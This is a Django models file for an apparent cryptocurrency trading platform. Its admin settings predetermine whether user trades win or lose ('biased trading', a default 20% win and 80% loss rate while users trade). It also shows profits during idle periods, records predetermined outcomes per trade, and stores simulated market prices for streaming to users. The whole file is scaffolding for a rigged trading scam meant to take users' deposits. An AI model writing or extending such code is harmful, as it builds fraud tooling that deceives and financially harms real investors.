from django.db import models
from django.core.validators import MinValueValidator, MaxValueValidator
from django.contrib.auth import get_user_model

User = get_user_model()


class TradingSettings(models.Model):
    """
    Admin-controlled trading settings that determine user trade outcomes
    """
    # General Settings
    is_active = models.BooleanField(default=True, help_text="Enable/disable biased trading")
    
    # IDLE MODE (No active user trading)
    idle_profit_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=5.00,
        help_text="Profit percentage when no users are actively trading"
    )
    
    idle_duration_seconds = models.IntegerField(
        default=1800,  # 30 minutes
        help_text="Trade duration in idle mode (seconds)"
    )
    
    # ACTIVE MODE (Users actively trading)
    active_win_rate_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=20.00,
        validators=[MinValueValidator(0), MaxValueValidator(100)],
        help_text="Probability of profit when users are actively trading (0-100%)"
    )
    
    active_profit_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=10.00,
        help_text="Profit percentage when users win in active mode"
    )
    
    active_loss_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=80.00,
        help_text="Loss percentage when users lose in active mode"
    )
    
    active_duration_seconds = models.IntegerField(
        default=300,  # 5 minutes
        help_text="Trade duration in active mode (seconds)"
    )
    
    # Legacy Win/Loss Configuration (kept for backward compatibility)
    win_rate_percentage = models.DecimalField(
        max_digits=5, 
        decimal_places=2, 
        default=20.00,
        validators=[MinValueValidator(0), MaxValueValidator(100)],
        help_text="Percentage of trades that should result in profit (0-100%)"
    )
    
    loss_rate_percentage = models.DecimalField(
        max_digits=5, 
        decimal_places=2, 
        default=80.00,
        validators=[MinValueValidator(0), MaxValueValidator(100)],
        help_text="Percentage of trades that should result in loss (0-100%)"
    )
    
    # Profit/Loss Magnitude
    min_profit_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=5.00,
        help_text="Minimum profit percentage for winning trades"
    )
    
    max_profit_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=15.00,
        help_text="Maximum profit percentage for winning trades"
    )
    
    min_loss_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=10.00,
        help_text="Minimum loss percentage for losing trades"
    )
    
    max_loss_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=30.00,
        help_text="Maximum loss percentage for losing trades"
    )
    
    # Time Periods
    min_trade_duration_seconds = models.IntegerField(
        default=30,
        help_text="Minimum trade duration in seconds"
    )
    
    max_trade_duration_seconds = models.IntegerField(
        default=14400,  # 4 hours
        help_text="Maximum trade duration in seconds"
    )
    
    # Market Volatility Simulation
    price_volatility_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        default=2.00,
        help_text="Price volatility for live data simulation (±%)"
    )
    
    update_interval_seconds = models.IntegerField(
        default=5,
        help_text="Price update interval for WebSocket in seconds"
    )
    
    # Real Price Integration
    use_real_prices = models.BooleanField(
        default=False,
        help_text="Use real cryptocurrency prices from exchanges (CoinGecko/CCXT)"
    )
    
    # Metadata
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    updated_by = models.ForeignKey(
        User, 
        on_delete=models.SET_NULL, 
        null=True, 
        related_name='trading_settings_updates'
    )
    
    class Meta:
        verbose_name = "Trading Settings"
        verbose_name_plural = "Trading Settings"
    
    def __str__(self):
        return f"Trading Settings (Win: {self.win_rate_percentage}%, Loss: {self.loss_rate_percentage}%)"
    
    def save(self, *args, **kwargs):
        # Ensure win_rate + loss_rate = 100%
        if self.win_rate_percentage + self.loss_rate_percentage != 100:
            # Auto-adjust loss rate
            self.loss_rate_percentage = 100 - self.win_rate_percentage
        super().save(*args, **kwargs)
    
    @classmethod
    def get_active_settings(cls):
        """Get the active trading settings or create default"""
        settings, created = cls.objects.get_or_create(
            is_active=True,
            defaults={
                'idle_profit_percentage': 5.00,
                'idle_duration_seconds': 1800,  # 30 minutes
                'active_win_rate_percentage': 20.00,
                'active_profit_percentage': 10.00,
                'active_loss_percentage': 80.00,
                'active_duration_seconds': 300,  # 5 minutes
                'win_rate_percentage': 20.00,
                'loss_rate_percentage': 80.00,
                'min_profit_percentage': 5.00,
                'max_profit_percentage': 15.00,
                'min_loss_percentage': 10.00,
                'max_loss_percentage': 30.00,
            }
        )
        return settings
    
    @classmethod
    def is_user_actively_trading(cls):
        """Check if any user has placed a trade in the last 10 minutes"""
        from django.utils import timezone
        from datetime import timedelta
        from trades.models import Trade
        
        ten_minutes_ago = timezone.now() - timedelta(minutes=10)
        recent_trades = Trade.objects.filter(
            created_at__gte=ten_minutes_ago
        ).exists()
        
        return recent_trades
    
    @classmethod
    def set_to_default(cls):
        """Reset to default settings"""
        settings = cls.get_active_settings()
        settings.idle_profit_percentage = 5.00
        settings.idle_duration_seconds = 1800  # 30 minutes
        settings.active_win_rate_percentage = 20.00
        settings.active_profit_percentage = 10.00
        settings.active_loss_percentage = 80.00
        settings.active_duration_seconds = 300  # 5 minutes
        settings.save()
        return settings


class UserTradeOutcome(models.Model):
    """
    Track predetermined outcomes for user trades
    """
    OUTCOME_CHOICES = [
        ('win', 'Win'),
        ('loss', 'Loss'),
    ]
    
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='trade_outcomes')
    trade = models.OneToOneField('trades.Trade', on_delete=models.CASCADE, related_name='outcome', null=True, blank=True)
    
    # Predetermined outcome
    outcome = models.CharField(max_length=4, choices=OUTCOME_CHOICES)
    outcome_percentage = models.DecimalField(
        max_digits=5,
        decimal_places=2,
        help_text="Profit or loss percentage"
    )
    
    # Timing
    duration_seconds = models.IntegerField(help_text="Trade duration in seconds")
    target_close_time = models.DateTimeField(help_text="When the trade should close")
    
    # Status
    is_executed = models.BooleanField(default=False)
    executed_at = models.DateTimeField(null=True, blank=True)
    
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-created_at']
    
    def __str__(self):
        return f"{self.user.email} - {self.outcome} ({self.outcome_percentage}%)"


class MarketDataSimulation(models.Model):
    """
    Store simulated market data for WebSocket streaming
    """
    cryptocurrency_symbol = models.CharField(max_length=10)
    timestamp = models.DateTimeField(auto_now_add=True)
    
    # OHLCV data
    open_price = models.DecimalField(max_digits=20, decimal_places=8)
    high_price = models.DecimalField(max_digits=20, decimal_places=8)
    low_price = models.DecimalField(max_digits=20, decimal_places=8)
    close_price = models.DecimalField(max_digits=20, decimal_places=8)
    volume = models.DecimalField(max_digits=20, decimal_places=8)
    
    class Meta:
        ordering = ['-timestamp']
        indexes = [
            models.Index(fields=['cryptocurrency_symbol', '-timestamp']),
        ]
    
    def __str__(self):
        return f"{self.cryptocurrency_symbol} - {self.close_price} @ {self.timestamp}"
